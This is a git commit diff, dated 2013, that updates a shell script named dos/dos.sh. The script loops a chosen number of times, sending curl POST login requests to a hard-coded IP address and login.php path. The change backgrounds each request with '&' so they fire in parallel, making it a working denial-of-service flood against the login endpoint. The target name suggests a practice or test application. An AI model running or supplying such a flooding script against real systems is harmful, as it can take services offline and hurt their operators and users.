99390cf9d1b462c6a1f55c3b7d6ca3c0083b1ac2
Mateusz Cieciura <mateusz5000@gmail.com>
2013-06-15 12:58:54 +0200

    Updated dos script

--- dos/dos.sh
+++ dos/dos.sh
@@ -2,6 +2,6 @@ app="193.168.0.186/pretty-secure-web-app/controllers/login.php"
 
 for i in `seq 1 $1`
 do
-	curl -X POST -d "login=hehe&password=hehe" $app
+	curl -X POST -d "login=hehe&password=hehe" $app &
 	echo $i
 done
